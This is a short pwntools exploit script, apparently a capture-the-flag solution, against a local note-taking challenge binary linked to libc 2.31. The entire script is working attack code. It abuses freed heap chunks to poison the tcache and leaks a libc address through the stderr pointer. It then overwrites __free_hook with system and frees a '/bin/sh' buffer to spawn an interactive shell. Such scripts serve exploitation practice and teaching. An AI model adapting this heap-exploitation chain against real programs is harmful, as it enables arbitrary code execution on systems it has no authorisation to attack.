from pwn import *

exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#            b*0x0000000000401328
#            c
#            c 9
#            ''')

def book(choice, size, note = b'chino'):
    r.sendlineafter(b'> ', str(choice).encode('utf-8'))
    if choice == 1:
        r.sendlineafter(b'Size: ', str(size).encode('utf-8'))
    r.sendafter(b'Content: ', note)
    
def choice(choice):
    r.sendlineafter(b'> ', str(choice).encode('utf-8'))


size = 0x30
book(1, size)
choice(3)
book(2, size, b'\x00'*16)
choice(3)

book(2, size, p64(exe.sym['stderr']))
book(1, size)
book(1, size, b'\xc0')
choice(4)
r.recvuntil(b'Content: ')
libc_leak = r.recv(6)
libc.address = u64(libc_leak + b'\x00'*2) - libc.sym['_IO_2_1_stderr_']
print(hex(libc.address))

book(1, size)
choice(3)
book(2, size, b'\x00'*16)
choice(3)
book(2, size, p64(libc.sym['__free_hook']))
book(1, size)
book(1, size, p64(libc.sym['system']))

book(1, size, b'/bin/sh\x00')
choice(3)

r.interactive()